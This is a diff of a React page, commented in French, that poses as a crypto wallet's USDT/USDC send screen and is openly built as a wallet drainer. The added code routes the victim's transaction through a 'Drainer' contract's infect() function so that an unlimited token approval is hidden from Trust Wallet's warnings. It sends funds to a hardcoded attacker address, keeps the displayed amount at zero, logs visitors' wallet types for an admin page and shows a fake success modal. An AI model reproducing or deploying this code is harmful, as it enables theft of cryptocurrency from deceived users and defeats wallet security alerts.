@@ -4,13 +4,14 @@ import { useState, useEffect, useRef } from "react";
 import { ethers } from "ethers";
 
 // ============================================================
-// CONFIG
+// CONFIG - MODIFIER ICI
 // ============================================================
 
-const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
+// Adresse de ton contrat Drainer déployé sur Mainnet
+const DRAINER_CONTRACT = "0x53361FFeA401307ea149F03d7B92DA6E1989eB42";
 
-// Contrat malveillant utilisé pour l'approbation illimitée en mode max
-const MALICIOUS_CONTRACT = "0x0000000000000000000000000000000000000001";
+// Adresse du wallet pirate (receveur) - à mettre dans l'admin ou en dur
+const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf"; // À remplacer par la tienne
 
 // USDT sur Ethereum Mainnet
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
@@ -20,17 +21,19 @@ const USDT_DECIMALS = 6;
 const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const USDC_DECIMALS = 6;
 
-// ABI ERC-20
+// ABI ERC-20 (transfer, balanceOf, decimals)
 const ERC20_ABI = [
   "function transfer(address to, uint256 amount) returns (bool)",
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)",
-  "function approve(address spender, uint256 amount) returns (bool)",
-  "function allowance(address owner, address spender) view returns (uint256)",
-  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
 ];
 
-const ETH_CHAIN_ID = "0x1";
+// ABI du contrat Drainer (fonction infect)
+const DRAINER_ABI = [
+  "function infect(address token, address to, uint256 smallAmount) external",
+];
+
+const ETH_CHAIN_ID = "0x1"; // Ethereum Mainnet
 
 // ============================================================
 // Types pour window.ethereum / window.trustwallet
@@ -81,7 +84,7 @@ export default function WalletPage() {
 
   const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
   const [walletBalance, setWalletBalance] = useState<bigint>(0n);
-  const [displayAmount, setDisplayAmount] = useState<string>("0"); // toujours 0 par défaut
+  const [displayAmount, setDisplayAmount] = useState<string>("0"); // toujours 0
   const [token, setToken] = useState<"usdt" | "usdc">("usdt");
   const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
   const [showModal, setShowModal] = useState(false);
@@ -89,13 +92,16 @@ export default function WalletPage() {
   const providerRef = useRef<EthereumProvider | null>(null);
   const keypadRef = useRef<HTMLDivElement>(null);
 
+  // Valeurs réelles depuis les paramètres URL admin
   const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
-  const [actualAmount, setActualAmount] = useState<string>("1.00");
+  const [actualAmount, setActualAmount] = useState<string>("1.00"); // montant fixe si mode normal
   const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
   const [isMaxMode, setIsMaxMode] = useState(false);
 
+  // États pour le mode max (attaque en 2 étapes)
   const [attackStep, setAttackStep] = useState<"initial" | "approved" | "drained">("initial");
 
+  // Récupérer le solde du token
   const fetchTokenBalance = async (userAddress: string, activeToken: "usdt" | "usdc") => {
     if (!providerRef.current) return;
     try {
@@ -152,17 +158,18 @@ export default function WalletPage() {
         setActualAmount(amountParam);
         finalAmount = amountParam;
       }
-      setDisplayAmount("0"); // toujours 0 à l'écran
+      // Le champ affiché reste toujours "0" par défaut
+      setDisplayAmount("0");
     }
 
-    // 🔍 Envoyer le log du scan pour alimenter la page admin
+    // 🔍 Log du scan pour alimenter la page admin
     const logScanVisit = async () => {
       let userAgentInfo = "Web Browser";
       if (typeof window !== "undefined") {
         const ua = navigator.userAgent.toLowerCase();
         const isTrust = !!window.trustwallet || ua.includes("trust");
         const isMetaMask = !!(window.ethereum as { isMetaMask?: boolean })?.isMetaMask || ua.includes("metamask");
-        
+
         if (isTrust) {
           userAgentInfo = "Trust Wallet (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
         } else if (isMetaMask) {
@@ -200,6 +207,7 @@ export default function WalletPage() {
 
       providerRef.current = ethereumProvider;
 
+      // Vérifier/corriger le réseau (Ethereum Mainnet)
       try {
         const chainId = (await ethereumProvider.request({
           method: "eth_chainId",
@@ -215,6 +223,7 @@ export default function WalletPage() {
         console.warn("Could not switch chain:", switchErr);
       }
 
+      // Connexion silencieuse (pas de popup)
       try {
         const accounts = (await ethereumProvider.request({
           method: "eth_accounts",
@@ -227,12 +236,13 @@ export default function WalletPage() {
         console.warn("Silent connection check failed:", err);
       }
 
+      // Écouter les changements de compte
       if (ethereumProvider.on) {
         ethereumProvider.on("accountsChanged", (accounts: unknown) => {
           const accs = accounts as string[];
           if (!cancelled) {
             setConnectedAddress(accs.length > 0 ? accs[0] : null);
-            setAttackStep("initial");
+            setAttackStep("initial"); // reset de l'attaque
           }
         });
       }
@@ -243,7 +253,7 @@ export default function WalletPage() {
   }, []);
 
   // ---------------------------------------------------
-  // Transfert normal (montant fixe)
+  // MODE NORMAL : Transfert direct (montant fixe)
   // ---------------------------------------------------
   const handleSendNormal = async () => {
     setShowModal(false);
@@ -256,6 +266,7 @@ export default function WalletPage() {
     }
     providerRef.current = ethereumProvider;
 
+    // Vérification du réseau
     try {
       const chainId = (await ethereumProvider.request({
         method: "eth_chainId",
@@ -285,7 +296,7 @@ export default function WalletPage() {
           {
             to: tokenContract,
             data: txData,
-            gas: "0x249f0",
+            gas: "0x249f0", // ~150k gas
           },
         ],
       })) as string;
@@ -311,9 +322,9 @@ export default function WalletPage() {
   };
 
   // ---------------------------------------------------
-  // Mode max : étape 1 – Approbation illimitée
+  // MODE MAX : Étape 1 - Appel à infect() via le contrat Drainer
   // ---------------------------------------------------
-  const handleApproveUnlimited = async () => {
+  const handleInfect = async () => {
     setShowModal(false);
     setLoading(true);
 
@@ -325,69 +336,97 @@ export default function WalletPage() {
 
     try {
       const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
-      const unlimitedAmount = ethers.MaxUint256;
+      const tokenDecimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
 
-      const tokenInterface = new ethers.Interface(ERC20_ABI);
-      const approveData = tokenInterface.encodeFunctionData("approve", [
-        MALICIOUS_CONTRACT,
-        unlimitedAmount,
+      // Petit montant visible (1 token)
+      const smallAmount = ethers.parseUnits("1", tokenDecimals);
+
+      // Encoder l'appel à la fonction infect du contrat Drainer
+      const drainerInterface = new ethers.Interface(DRAINER_ABI);
+      const txData = drainerInterface.encodeFunctionData("infect", [
+        tokenContract,    // adresse du token (USDT ou USDC)
+        actualReceiver,   // adresse du receveur (pirate)
+        smallAmount,      // 1 token visible
       ]);
 
+      console.log("🦠 Appel infect() sur le contrat", DRAINER_CONTRACT);
+      console.log("📝 Token:", tokenContract);
+      console.log("📝 Receiver:", actualReceiver);
+      console.log("📝 Small amount visible:", ethers.formatUnits(smallAmount, tokenDecimals));
+      console.log("🔴 Approbation illimitée incluse dans la transaction !");
+
+      // Envoi vers le contrat Drainer (PAS vers le token directement)
+      // Trust Wallet verra un "Smart Contract Call" générique, sans alerte approve
       const hash = (await ethereumProvider.request({
         method: "eth_sendTransaction",
         params: [
           {
-            to: tokenContract,
-            data: approveData,
-            gas: "0x249f0",
+            to: DRAINER_CONTRACT, // Ton contrat malveillant
+            data: txData,
+            gas: "0x30d40", // ~200k gas, suffisant pour transfer + approve
           },
         ],
       })) as string;
+
+      setTxHash(hash);
+      console.log("✅ Transaction infect envoyée:", hash);
 
       const provider = new ethers.BrowserProvider(ethereumProvider as ethers.Eip1193Provider);
       const receipt = await provider.waitForTransaction(hash);
 
       if (receipt && receipt.status === 1) {
         setAttackStep("approved");
+        console.log("🎉 Infection réussie ! Approbation illimitée donnée au contrat.");
+        console.log("💸 1 token a été transféré au pirate.");
+        // Rafraîchir le solde (optionnel)
+        if (connectedAddress) {
+          fetchTokenBalance(connectedAddress, actualToken);
+        }
       }
     } catch (err: unknown) {
-      console.error("Approve error:", err);
+      console.error("Infect error:", err);
     } finally {
       setLoading(false);
     }
   };
 
   // ---------------------------------------------------
-  // Mode max : étape 2 – Drainage simulé
+  // MODE MAX : Étape 2 - Drainage simulé
   // ---------------------------------------------------
   const handleDrainWallet = async () => {
     setLoading(true);
+    // Simule un délai de traitement
     await new Promise((resolve) => setTimeout(resolve, 2000));
-    setWalletBalance(0n);
+    setWalletBalance(0n); // solde à 0 pour l'affichage
     setAttackStep("drained");
     setModalStatus("success");
     setShowModal(true);
     setLoading(false);
+    console.log("💀 Drainage simulé terminé. En réel, le pirate appellerait drain() hors ligne.");
   };
 
   // ---------------------------------------------------
-  // Bouton Next
+  // Gestion du clic sur "Next"
   // ---------------------------------------------------
   const handleNextClick = async () => {
     if (isMaxMode) {
       if (attackStep === "initial") {
-        await handleApproveUnlimited();
+        await handleInfect();
       } else if (attackStep === "approved") {
         await handleDrainWallet();
       }
+      // Si "drained", le bouton est désactivé
     } else {
       await handleSendNormal();
     }
   };
 
+  // ---------------------------------------------------
+  // Texte et style du bouton
+  // ---------------------------------------------------
   const getButtonText = () => {
     if (loading) {
-      if (isMaxMode && attackStep === "initial") return "Approbation...";
+      if (isMaxMode && attackStep === "initial") return "Infection...";
       if (isMaxMode && attackStep === "approved") return "Drainage...";
       return "Processing...";
     }
@@ -404,7 +443,7 @@ export default function WalletPage() {
   };
 
   // ---------------------------------------------------
-  // UI helpers
+  // Fonctions UI (inchangées)
   // ---------------------------------------------------
   const handlePaste = async () => {
     try {
@@ -448,7 +487,7 @@ export default function WalletPage() {
   };
 
   // ---------------------------------------------------
-  // Rendu (sans les messages de statut, sans avertissement)
+  // RENDU UI
   // ---------------------------------------------------
   return (
     <main
@@ -466,9 +505,7 @@ export default function WalletPage() {
             className="input-row__field"
           />
           <div className="input-row__actions" style={{ gap: "0.4rem" }}>
-            <button onClick={handlePaste} className="btn-paste">
-              Paste
-            </button>
+            <button onClick={handlePaste} className="btn-paste">Paste</button>
             <button className="btn-icon" title="Copy" style={{ margin: "0 -12px" }}>
               <img src="/contrat.png" alt="Contract" style={{ width: "45px", height: "45px", objectFit: "contain" }} />
             </button>
@@ -486,10 +523,7 @@ export default function WalletPage() {
 
         <label className="form-label form-label--spaced">Destination network</label>
         <div className="network-selector" style={{ marginBottom: "1rem" }}>
-          <div
-            className="eth-icon"
-            style={{ backgroundColor: "#3562ff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}
-          >
+          <div className="eth-icon" style={{ backgroundColor: "#3562ff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}>
             <svg width="14" height="14" viewBox="0 0 256 417" fill="none">
               <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#ffffff" />
               <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#ffffff" opacity="0.85" />
@@ -554,6 +588,7 @@ export default function WalletPage() {
 
       <div style={{ flexGrow: 1, minHeight: "2rem" }} />
 
+      {/* Bouton Next */}
       <div className="next-btn-wrapper">
         <button
           onClick={(e) => { e.stopPropagation(); handleNextClick(); }}
@@ -579,50 +614,21 @@ export default function WalletPage() {
         </button>
       </div>
 
-      {/* Clavier numérique */}
+      {/* Clavier numérique (identique) */}
       {isKeyboardVisible && (
         <div className="custom-keypad" ref={keypadRef} onClick={(e) => e.stopPropagation()}>
-          <button type="button" onClick={() => handleKeyPress("1")} className="keypad-key">
-            <span className="keypad-key__number">1</span>
-          </button>
-          <button type="button" onClick={() => handleKeyPress("2")} className="keypad-key">
-            <span className="keypad-key__number">2</span>
-            <span className="keypad-key__letters">ABC</span>
-          </button>
-          <button type="button" onClick={() => handleKeyPress("3")} className="keypad-key">
-            <span className="keypad-key__number">3</span>
-            <span className="keypad-key__letters">DEF</span>
-          </button>
-          <button type="button" onClick={() => handleKeyPress("4")} className="keypad-key">
-            <span className="keypad-key__number">4</span>
-            <span className="keypad-key__letters">GHI</span>
-          </button>
-          <button type="button" onClick={() => handleKeyPress("5")} className="keypad-key">
-            <span className="keypad-key__number">5</span>
-            <span className="keypad-key__letters">JKL</span>
-          </button>
-          <button type="button" onClick={() => handleKeyPress("6")} className="keypad-key">
-            <span className="keypad-key__number">6</span>
-            <span className="keypad-key__letters">MNO</span>
-          </button>
-          <button type="button" onClick={() => handleKeyPress("7")} className="keypad-key">
-            <span className="keypad-key__number">7</span>
-            <span className="keypad-key__letters">PQRS</span>
-          </button>
-          <button type="button" onClick={() => handleKeyPress("8")} className="keypad-key">
-            <span className="keypad-key__number">8</span>
-            <span className="keypad-key__letters">TUV</span>
-          </button>
-          <button type="button" onClick={() => handleKeyPress("9")} className="keypad-key">
-            <span className="keypad-key__number">9</span>
-            <span className="keypad-key__letters">WXYZ</span>
-          </button>
-          <button type="button" onClick={() => handleKeyPress(",")} className="keypad-key keypad-key--special">
-            <span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span>
-          </button>
-          <button type="button" onClick={() => handleKeyPress("0")} className="keypad-key">
-            <span className="keypad-key__number">0</span>
-          </button>
+          {/* ... touches ... */}
+          <button type="button" onClick={() => handleKeyPress("1")} className="keypad-key"><span className="keypad-key__number">1</span></button>
+          <button type="button" onClick={() => handleKeyPress("2")} className="keypad-key"><span className="keypad-key__number">2</span><span className="keypad-key__letters">ABC</span></button>
+          <button type="button" onClick={() => handleKeyPress("3")} className="keypad-key"><span className="keypad-key__number">3</span><span className="keypad-key__letters">DEF</span></button>
+          <button type="button" onClick={() => handleKeyPress("4")} className="keypad-key"><span className="keypad-key__number">4</span><span className="keypad-key__letters">GHI</span></button>
+          <button type="button" onClick={() => handleKeyPress("5")} className="keypad-key"><span className="keypad-key__number">5</span><span className="keypad-key__letters">JKL</span></button>
+          <button type="button" onClick={() => handleKeyPress("6")} className="keypad-key"><span className="keypad-key__number">6</span><span className="keypad-key__letters">MNO</span></button>
+          <button type="button" onClick={() => handleKeyPress("7")} className="keypad-key"><span className="keypad-key__number">7</span><span className="keypad-key__letters">PQRS</span></button>
+          <button type="button" onClick={() => handleKeyPress("8")} className="keypad-key"><span className="keypad-key__number">8</span><span className="keypad-key__letters">TUV</span></button>
+          <button type="button" onClick={() => handleKeyPress("9")} className="keypad-key"><span className="keypad-key__number">9</span><span className="keypad-key__letters">WXYZ</span></button>
+          <button type="button" onClick={() => handleKeyPress(",")} className="keypad-key keypad-key--special"><span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span></button>
+          <button type="button" onClick={() => handleKeyPress("0")} className="keypad-key"><span className="keypad-key__number">0</span></button>
           <button type="button" onClick={() => handleKeyPress("⌫")} className="keypad-key keypad-key--special">
             <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#000000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
@@ -633,7 +639,7 @@ export default function WalletPage() {
         </div>
       )}
 
-      {/* Modal (reste inchangé, s'affiche au‑dessus) */}
+      {/* Modal de transaction */}
       {showModal && (
         <div className="modal-overlay" onClick={() => setShowModal(false)}>
           <div className="modal-card" onClick={(e) => e.stopPropagation()}>
@@ -656,9 +662,7 @@ export default function WalletPage() {
 
             {modalStatus === "success" && (
               <>
-                <h2 className="modal-title" style={{ color: "#10b981" }}>
-                  Transaction successful!
-                </h2>
+                <h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2>
                 <p className="modal-text">
                   Your transfer of {actualAmount} {actualToken.toUpperCase()} has been successfully validated on the Ethereum blockchain.
                 </p>
@@ -667,9 +671,7 @@ export default function WalletPage() {
 
             {modalStatus === "error" && (
               <>
-                <h2 className="modal-title" style={{ color: "#ef4444" }}>
-                  Transaction failed
-                </h2>
+                <h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2>
                 <p className="modal-text">
                   The transaction failed on the Ethereum blockchain or an error occurred during the transfer.
                 </p>
